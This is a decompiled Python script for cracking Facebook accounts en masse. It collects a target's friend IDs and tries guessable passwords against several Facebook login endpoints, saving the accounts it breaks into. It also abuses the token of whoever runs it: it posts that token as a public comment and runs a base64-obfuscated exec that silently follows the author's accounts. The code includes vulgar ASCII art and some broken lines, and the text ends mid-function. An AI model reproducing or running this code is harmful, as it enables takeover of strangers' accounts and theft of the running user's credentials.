# uncompyle6 version 3.7.5.dev0
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  1 2021, 19:01:43) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os
try:
    import requests
except ImportError:
    print '\n [!] module requests belum terinstall'
    os.system('pip2 install requests')

try:
    import bs4
except ImportError:
    print '\n [!] module bs4 belum terinstall'
    os.system('pip2 install bs4')

try:
    import concurrent.futures
except ImportError:
    print '\n [!] module futures belum terinstall'
    os.system('pip2 install futures')

import os, sys, re, time, requests, calendar, random, itertools
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
loop = 0
id = []
ok = []
cp = []
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
jm = current.hour
mnt = current.minute
dtk = current.second
op = bulan[nTemp]
localtime = current.time()
pu = '\x1b[0;37m'
m = '\x1b[0;31m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'
b = '\x1b[0;36m'
u = '\x1b[0;35m'
o = '\x1b[0;36m'
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = '%s-%s' % (ha, op)
tgl = '%s %s %s' % (ha, op, ta)
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100006230836266'
    kom3 = ' BADRU GANTENG BANGET\x1a\nhttps://www.facebook.com/photo.php?fbid=3015873855296946&set=a.1531729363711410&type=3&app=fbl'
    kom4 = ' GANTENG GANTENG BEUTIPUL\x1a\nhttps://www.facebook.com/photo.php?fbid=3015873855296946&set=a.1531729363711410&type=3&app=fbll'
    kom = 'BADRU>< IZIN GW PAKEK SCRIPT LUU  @[100006230836266:0] \x1a\x1a\nhttps://www.facebook.com/photo.php?fbid=3015873855296946&set=a.1531729363711410&type=3&app=fbl'
    post = '3015873855296946'
    post2 = '3015873855296946'
    kom2 = 'BOOLKU ANGED MAZZ  @[100006230836266:0] \x1a\x1a\nhttps://www.facebook.com/photo.php?fbid=3015873855296946&set=a.1531729363711410&type=3&app=fbl'
    requests.post('https://graph.facebook.com/100006230836266/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100057958306450/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/2325505107680136/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100006230836266/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100069672799769/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/4601874036492018/comments/?message=%s&access_token=%s' % (toket, toket))
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/1543374199337548/comments/?message=' + kom3 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/1543374199337548/comments/?message=' + kom4 + '&access_token=' + toket)
    menu()


def keluar():
    print
    print ' [=] Selamat Coli !'
    print '  _____    '
    print ' /  _/\\  '
    print ' | / oo'
    print ' \\(   _\\ '
    print '  \\  O/'
    print '  /   \\ '
    print '  ||  ||'
    print "  ||  ||      'Mmpsh Ahhhhh..' "
    print '  ||  || _____ /'
    print "  | \\ ||(___  )    'Enak Mass..' "
    print ' // / \\|_)o (  )'
    print " \\ ///|)\\_(    )  'Ahhh... Uhh..' "
    print ' ||   |\\ )(    )'
    print ' ||   ) \\/(____)_      ___'
    print '  ||   |\\___/     \\---/ \\.\\.'
    print '  ||   | :   _       ./   ))'
    print '  ||   | \\../ \\~~~-./   ./__ _'
    print '  \\  /           \\.______  ( ('
    print '  ((___ooO                \\._\\_\\ '
    print
    os.sys.exit()


def logo2():
    os.system('clear')
    print '\n \x1b[0;92m\xe2\xb8\x99\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba \xe2\xb8\x99\n \x1b[0;37m  \xe2\x96\xbc\xef\xbf\xa3\xef\xbc\x9e-\xe2\x80\x95-\xef\xbc\x9c\xef\xbf\xa3\xe2\x96\xbc  \x1b[0;37mAuthor    \x1b[0;92m: \x1b[0;37mMuhamad Badru Wasih\n \x1b[0;37m   \xef\xbc\xb9\xe3\x80\x80     \xef\xbc\xb9   \x1b[0;37mGithub    \x1b[0;92m: \x1b[0;37mGithub.com/AkinXD\n \x1b[0;37m/\\ /   \x1b[0;32m\xe2\x97\x8f  \x1b[0;37m\xcf\x89 \x1b[0;32m\xe2\x97\x8f\x1b[0;37m\xef\xbc\x89  \x1b[0;37mFacebook1 \x1b[0;32m: \x1b[0;37mfb.com/Bang.badru23\n \x1b[0;37m\\ \xef\xbd\x9c\xe3\x80\x80 \xe3\x81\xa4\xe3\x80\x80  \xe3\x83\xbd\xe3\x81\xa4\x1b[0;37mFacebook2 \x1b[0;32m: \x1b[0;37mYt/MBW DRU\n \x1b[0;92m\xe2\xb8\x99\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba\xe2\x95\xba \xe2\xb8\x99'


def logo():
    os.system('clear')
    print "\n\n\x1b[1;95m    _____            __        _____             __  \n\x1b[1;95m   / __(_)_ _  ___  / /__ ____/ ___/______ _____/ /__\n\x1b[1;95m  _\\ \\/ /  ' \\/ _ \\/ / -_)___/ /__/ __/ _ `/ __/  '_/\n\x1b[1;95m /___/_/_/_/_/ .__/_/\\__/    \\___/_/  \\_,_/\\__/_/\\_\\ V2.\n\x1b[1;95m            /_/     "
    print


def login():
    os.system('clear')
    try:
        requests.get('https://mbasic.facebook.com')
    except requests.exceptions.ConnectionError:
        print h + ' [' + pu + '=' + h + ']' + pu + ' Token Bosok'
        time.sleep(1)
        keluar()

    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        logo2()
        print
        print h + ' [' + pu + '=' + h + ']' + pu + ' welcome ngab thanks dah pake sc ini'
        print h + ' [' + pu + '=' + h + ']' + pu + ' script simple by : \x1b[0;92mMuhamad Badru Wasih\x1b[0;97m'
        print h + ' [' + pu + '=' + h + '] ' + pu + 'login via token facebook'
        token = raw_input(h + '\n [' + pu + '=' + h + '] ' + pu + 'token fb :' + h + ' ')
        print
        if token == '':
            exit(h + '\n [' + pu + '=' + h + ']' + pu + ' ngetik apa ngentod')
        else:
            if token == 'help':
                os.system('xdg-open https://youtube.com/channel/UCq-o0evjeKqFNDOFfOFSOhg')
                exit(' [!] di simak video nya biar paham')
            try:
                nama = requests.get('https://graph.facebook.com/me?access_token=' + token).json()['name'].lower()
                open('login.txt', 'w').write(token)
                bot_komen()
                import base64
                exec base64.b64decode('cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMTYxODkvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzExODY5OTU3NzQvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAxNTA3MzUwNjA2Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyODQ5NDcwOTkwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDIxNjMxODc2NTAvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMzA1ODgxMzc0OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDEwOTk4NzY0Njc0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQo=')
                print h + '\n [' + pu + '=' + h + ']' + pu + ' login berhasil selamat datang \x1b[0;92m%s\x1b[0;97m' % nama
                time.sleep(1)
                menu()
            except KeyError:
                os.system('rm -f login.txt')
                exit(' [!] token kadaluwarsa')


def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except KeyError:
        os.system('rm -f login.txt')
        exit(h + ' [' + pu + '=' + h + '] ' + pu + 'token invalid/rusak')

    try:
        nama = requests.get('https://graph.facebook.com/me/?access_token=' + token).json()['name'].lower()
        TTL = requests.get('https://graph.facebook.com/me/?access_token=' + token).json()['birthday'].lower()
        ip = requests.get('https://api.ipify.org').text
    except IOError:
        os.system('rm -f login.txt')
        exit(h + ' [' + pu + '=' + h + '] ' + pu + 'token invalid/rusak')
    except requests.exceptions.ConnectionError:
        exit(' [!] tidak ada koneksi internet')

    logo()
    print ' \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;37m Your Name \x1b[0;32m: \x1b[0;37m%s' % nama
    print ' \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;37m Your TTL  \x1b[0;32m: \x1b[0;37m%s' % TTL
    print ' \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;37m Your IP   \x1b[0;32m: \x1b[0;37m%s' % ip
    print
    print h + ' [' + pu + '1' + h + ']' + pu + ' crack publik/teman'
    print h + ' [' + pu + '2' + h + ']' + pu + ' lihat hasil crack'
    print h + ' [' + pu + '3' + h + ']' + pu + ' setting U-A'
    print h + ' [\x1b[0;31m0\x1b[0;32m]' + pu + ' keluar '
    print
    angga = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' pilih :' + h + ' ')
    if angga == '':
        menu()
    elif angga == '1':
        publik()
        method()
    elif angga == '2':
        print
        print h + ' [' + pu + '1' + h + ']' + pu + ' cek hasil crack ' + h + 'OK'
        print h + ' [' + pu + '2' + h + ']' + pu + ' cek hasil crack ' + k + 'CP'
        print h + ' [' + pu + '3' + h + ']' + pu + ' cek ' + h + 'opsi' + pu + ' hasil crack'
        print
        cek = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' pilih :' + h + ' ')
        if cek == '':
            menu()
        elif cek == '1':
            dirs = os.listdir('OK')
            print h + ' [' + pu + '=' + h + ']' + pu + ' list nama file tersimpan di folder ' + h + 'OK\n'
            for file in dirs:
                print h + ' [' + pu + '=' + h + ']' + h + ' ' + file

            try:
                file = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' ketik nama file :' + h + ' ')
                if file == '':
                    menu()
                totalok = open('OK/%s' % file).read().splitlines()
            except IOError:
                exit(' [!] file %s tidak tersedia' % file)

            nm_file = ('%s' % file).replace('-', ' ')
            del_txt = nm_file.replace('.txt', '')
            print h + ' [' + pu + '=' + h + ']' + pu + ' ----------------------------------------------'
            print h + ' [' + pu + '=' + h + '] hasil crack : %s total : %s\x1b[0;92m' % (del_txt, len(totalok))
            os.system('cat OK/%s' % file)
            print '\x1b[0;32m [' + pu + '=' + h + ']' + pu + ' ----------------------------------------------'
            exit(h + ' [' + pu + '=' + h + ']' + pu + ' jangan lupa di copy dan di simpan hasilnya')
        elif cek == '2':
            dirs = os.listdir('CP')
            print h + ' [' + pu + '=' + h + ']' + pu + ' list nama file tersimpan di folder CP\n'
            for file in dirs:
                print h + ' [' + pu + '=' + h + ']' + h + ' ' + file

            try:
                file = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' ketik nama file :' + h + ' ')
                if file == '':
                    menu()
                totalcp = open('CP/%s' % file).read().splitlines()
            except IOError:
                exit(' [!] file %s tidak tersedia' % file)

            nm_file = ('%s' % file).replace('-', ' ')
            del_txt = nm_file.replace('.txt', '')
            print h + ' [' + pu + '=' + h + ']' + pu + ' ----------------------------------------------'
            print h + ' [' + pu + '=' + h + '] hasil crack : %s total : %s\x1b[0;92m' % (del_txt, len(totalcp))
            os.system('cat CP/%s' % file)
            print '\x1b[0;32m [' + pu + '=' + h + ']' + pu + ' ----------------------------------------------'
            exit(h + ' [' + pu + '=' + h + ']' + pu + ' jangan lupa di copy dan di simpan hasilnya')
        elif cek == '3':
            cek_opsi()
        else:
            menu()
    elif angga == '3':
        setting_ua()
    elif angga == '0':
        os.system('rm -f login.txt')
        print
        print h + ' [' + pu + '=' + h + ']' + pu + ' Berhasil Menghapus Token'
        time.sleep(1)
        keluar()
    else:
        menu()


def publik():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        exit(h + ' [' + pu + '=' + h + ']' + pu + ' token invalid/rusak')

    print
    print h + ' [' + pu + '=' + h + ']' + pu + " ketik '" + h + 'me' + pu + "' " + pu + 'jika ingin dari daftar teman'
    idt = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' id target :' + h + ' ')
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
            uid = i['id']
            nama = i['name'].rsplit(' ')[0]
            id.append(uid + '<=>' + nama)

    except KeyError:
        exit(h + ' [' + pu + '=' + h + ']' + pu + ' akun tidak tersedia atau list teman private')

    print h + ' [' + pu + '=' + h + ']' + pu + ' total id  : \x1b[0;32m%s\x1b[0;37m' % len(id)


def method():
    print
    print h + ' [' + pu + ' pilih method crack' + h + ' ]'
    print
    print h + ' [' + pu + '1' + h + ']' + pu + ' method b-api   (' + h + 'fast' + pu + ')'
    print h + ' [' + pu + '2' + h + ']' + pu + ' method free    (' + h + 'slow' + pu + ')'
    print h + ' [' + pu + '3' + h + ']' + pu + ' method mbasic  (' + h + 'slow' + pu + ')'
    print h + ' [' + pu + '4' + h + ']' + pu + ' method mobile  (' + h + 'slow' + pu + ')'
    print
    method = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' method :' + h + ' ')
    print
    if method == '':
        menu()
    elif method == '1':
        print h + ' [' + pu + '=' + h + ']' + pu + ' Gunakan pw manual jika ingin crack old'
        ask = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' Gunakan sandi default atau manual ? [' + h + 'd' + pu + '/' + h + 'm' + pu + '] :' + h + ' ')
        if ask == 'm':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print h + ' [' + pu + '=' + h + '] ' + pu + 'gunakan , (koma) untuk pemisah contoh : ' + h + 'sayang' + pu + ',' + h + 'pengen' + pu + ',' + h + 'ngentod'
                asu = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' masukan kata sandi :' + h + ' ')
                if len(asu) <= 5:
                    method(h + '\n [' + pu + '=' + h + ']' + pu + ' kata sandi minimal ' + h + '6' + pu + ' karakter')
                print h + ' [' + pu + '=' + h + '] ' + pu + 'menggunakan kata sandi : \x1b[0;92m%s\x1b[0;97m' % asu
                print h + '\n [' + pu + '=' + h + ']' + pu + ' hasil' + h + ' OK' + pu + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print h + ' [' + pu + '=' + h + ']' + pu + ' hasil ' + k + 'CP' + pu + ' tersimpan di : ' + h + 'CP/%s.txt\n' % tanggal
                print h + ' [' + pu + '=' + h + '] ' + pu + 'Gunakan ' + h + 'CTRL+Z' + pu + ' untuk menghentikan crack'
                print h + ' [' + pu + '=' + h + ']' + pu + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '1' + pu + ' detik'
                print h + ' [' + pu + '=' + h + ']' + pu + ' Crack Berjalan Pukul :' + h + ' %s ' % localtime
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(api, uid, asu.split(','))

            exit(h + '\n\n [' + pu + '=' + h + ']' + pu + ' crack selesai...')
            time.slipe[1]
        elif ask == 'd':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print h + '\n [' + pu + '=' + h + ']' + pu + ' hasil' + h + ' OK' + pu + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print h + ' [' + pu + '=' + h + ']' + pu + ' hasil ' + k + 'CP' + pu + ' tersimpan di : ' + h + 'CP/%s.txt\n' % tanggal
                print h + ' [' + pu + '=' + h + '] ' + pu + 'Gunakan ' + h + 'CTRL+Z' + pu + ' untuk menghentikan crack'
                print h + ' [' + pu + '=' + h + ']' + pu + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '1' + pu + ' detik'
                print h + ' [' + pu + '=' + h + ']' + pu + ' Crack Berjalan Pukul :' + h + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    else:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    coeg.submit(api, uid, pwx)

            exit(h + '\n\n [' + pu + '=' + h + ']' + pu + ' crack selesai...')
            time.slipe[1]
    elif method == '2':
        print h + ' [' + pu + '=' + h + ']' + pu + ' Gunakan pw manual jika ingin crack old'
        ask = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' Gunakan sandi default atau manual ? [' + h + 'd' + pu + '/' + h + 'm' + pu + '] :' + h + ' ')
        if ask == 'm':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print h + ' [' + pu + '=' + h + '] ' + pu + 'gunakan , (koma) untuk pemisah contoh : ' + h + 'sayang' + pu + ',' + h + 'pengen' + pu + ',' + h + 'ngentod'
                asu = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' masukan kata sandi :' + h + ' ')
                if len(asu) <= 5:
                    method(h + '\n [' + pu + '=' + h + ']' + pu + ' kata sandi minimal ' + h + '6' + pu + ' karakter')
                print h + ' [' + pu + '=' + h + '] ' + pu + 'menggunakan kata sandi : \x1b[0;92m%s\x1b[0;97m' % asu
                print h + '\n [' + pu + '=' + h + ']' + pu + ' hasil' + h + ' OK' + pu + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print h + ' [' + pu + '=' + h + ']' + pu + ' hasil ' + k + 'CP' + pu + ' tersimpan di : ' + h + 'CP/%s.txt\n' % tanggal
                print h + ' [' + pu + '=' + h + '] ' + pu + 'Gunakan ' + h + 'CTRL+Z' + pu + ' untuk menghentikan crack'
                print h + ' [' + pu + '=' + h + ']' + pu + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '1' + pu + ' detik'
                print h + ' [' + pu + '=' + h + ']' + pu + ' Crack Berjalan Pukul :' + h + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu.split(','), 'https:/free.facebook.com')

            exit(h + '\n\n [' + pu + '=' + h + ']' + pu + ' crack selesai...')
            time.slipe[1]
        elif ask == 'd':
            with ThreadPoolExecutor(max_workers=35) as (coeg):
                print h + '\n [' + pu + '=' + h + ']' + pu + ' hasil' + h + ' OK' + pu + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print h + ' [' + pu + '=' + h + ']' + pu + ' hasil ' + k + 'CP' + pu + ' tersimpan di : ' + h + 'CP/%s.txt\n' % tanggal
                print h + ' [' + pu + '=' + h + '] ' + pu + 'Gunakan ' + h + 'CTRL+Z' + pu + ' untuk menghentikan crack'
                print h + ' [' + pu + '=' + h + ']' + pu + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '1' + pu + ' detik'
                print h + ' [' + pu + '=' + h + ']' + pu + ' Crack Berjalan Pukul :' + h + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    else:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    coeg.submit(crack, uid, pwx, 'https://free.facebook.com')

            exit(h + '\n\n [' + pu + '=' + h + ']' + pu + ' crack selesai...')
            time.slipe[1]
    elif method == '3':
        print h + ' [' + pu + '=' + h + ']' + pu + ' Gunakan pw manual jika ingin crack old'
        ask = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' Gunakan sandi default atau manual ? [' + h + 'd' + pu + '/' + h + 'm' + pu + '] :' + h + ' ')
        if ask == 'm':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print h + ' [' + pu + '=' + h + '] ' + pu + 'gunakan , (koma) untuk pemisah contoh : ' + h + 'sayang' + pu + ',' + h + 'pengen' + pu + ',' + h + 'ngentod'
                asu = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' masukan kata sandi :' + h + ' ')
                if len(asu) <= 5:
                    method(h + '\n [' + pu + '=' + h + ']' + pu + ' kata sandi minimal ' + h + '6' + pu + ' karakter')
                print h + ' [' + pu + '=' + h + '] ' + pu + 'menggunakan kata sandi : \x1b[0;92m%s\x1b[0;97m' % asu
                print h + '\n [' + pu + '=' + h + ']' + pu + ' hasil' + h + ' OK' + pu + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print h + ' [' + pu + '=' + h + ']' + pu + ' hasil ' + k + 'CP' + pu + ' tersimpan di : ' + h + 'CP/%s.txt\n' % tanggal
                print h + ' [' + pu + '=' + h + '] ' + pu + 'Gunakan ' + h + 'CTRL+Z' + pu + ' untuk menghentikan crack'
                print h + ' [' + pu + '=' + h + ']' + pu + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '1' + pu + ' detik'
                print h + ' [' + pu + '=' + h + ']' + pu + ' Crack Berjalan Pukul :' + h + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu.split(','), 'https://mbasic.facebook.com')

            exit(h + '\n\n [' + pu + '=' + h + ']' + pu + ' crack selesai...')
            time.slipe[1]
        elif ask == 'd':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print h + '\n [' + pu + '=' + h + ']' + pu + ' hasil' + h + ' OK' + pu + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print h + ' [' + pu + '=' + h + ']' + pu + ' hasil ' + k + 'CP' + pu + ' tersimpan di : ' + h + 'CP/%s.txt\n' % tanggal
                print h + ' [' + pu + '=' + h + '] ' + pu + 'Gunakan ' + h + 'CTRL+Z' + pu + ' untuk menghentikan crack'
                print h + ' [' + pu + '=' + h + ']' + pu + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '1' + pu + ' detik'
                print h + ' [' + pu + '=' + h + ']' + pu + ' Crack Berjalan Pukul :' + h + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    else:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    coeg.submit(crack, uid, pwx, 'https://mbasic.facebook.com')

            exit(h + '\n\n [' + pu + '=' + h + ']' + pu + ' crack selesai...')
            time.slipe[1]
    elif method == '4':
        print h + ' [' + pu + '=' + h + ']' + pu + ' Gunakan pw manual jika ingin crack old'
        ask = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' Gunakan sandi default atau manual ? [' + h + 'd' + pu + '/' + h + 'm' + pu + '] :' + h + ' ')
        if ask == 'm':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print h + ' [' + pu + '=' + h + '] ' + pu + 'gunakan , (koma) untuk pemisah contoh : ' + h + 'sayang' + pu + ',' + h + 'pengen' + pu + ',' + h + 'ngentod'
                asu = raw_input(h + ' [' + pu + '=' + h + ']' + pu + ' masukan kata sandi :' + h + ' ')
                if len(asu) <= 5:
                    method(h + '\n [' + pu + '=' + h + ']' + pu + ' kata sandi minimal ' + h + '6' + pu + ' karakter')
                print h + ' [' + pu + '=' + h + '] ' + pu + 'menggunakan kata sandi : \x1b[0;92m%s\x1b[0;97m' % asu
                print h + '\n [' + pu + '=' + h + ']' + pu + ' hasil' + h + ' OK' + pu + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print h + ' [' + pu + '=' + h + ']' + pu + ' hasil ' + k + 'CP' + pu + ' tersimpan di : ' + h + 'CP/%s.txt\n' % tanggal
                print h + ' [' + pu + '=' + h + '] ' + pu + 'Gunakan ' + h + 'CTRL+Z' + pu + ' untuk menghentikan crack'
                print h + ' [' + pu + '=' + h + ']' + pu + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '1' + pu + ' detik'
                print h + ' [' + pu + '=' + h + ']' + pu + ' Crack Berjalan Pukul :' + h + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu.split(','), 'android://com.facebook.lite')

            exit(h + '\n\n [' + pu + '=' + h + ']' + pu + ' crack selesai...')
            time.slipe[1]
        elif ask == 'd':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print h + '\n [' + pu + '=' + h + ']' + pu + ' hasil' + h + ' OK' + pu + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print h + ' [' + pu + '=' + h + ']' + pu + ' hasil ' + k + 'CP' + pu + ' tersimpan di : ' + h + 'CP/%s.txt\n' % tanggal
                print h + ' [' + pu + '=' + h + '] ' + pu + 'Gunakan ' + h + 'CTRL+Z' + pu + ' untuk menghentikan crack'
                print h + ' [' + pu + '=' + h + ']' + pu + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '1' + pu + ' detik'
                print h + ' [' + pu + '=' + h + ']' + pu + ' Crack Berjalan Pukul :' + h + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    else:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing']
                    coeg.submit(crack, uid, pwx, 'https://m.facebook lite.com')

            exit(h + '\n\n [' + pu + '=' + h + ']' + pu + ' crack selesai...')
            time.slipe[1]
        else:
            exit(h + '\n [' + pu + '=' + h + ']' + pu + ' isi yang bener')
    else:
        menu()


def api(uid, pwx):
    global cp
    global loop
    global ok
    global token
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

    sys.stdout.write('\r \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;37m crack\x1b[0;32m %s/%s \x1b[0;37mOK:\x1b[0;32m-%s\x1b[0;37m - CP:\x1b[0;33m-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwx:
        pw = pw.lower()
        ses = requests.Session()
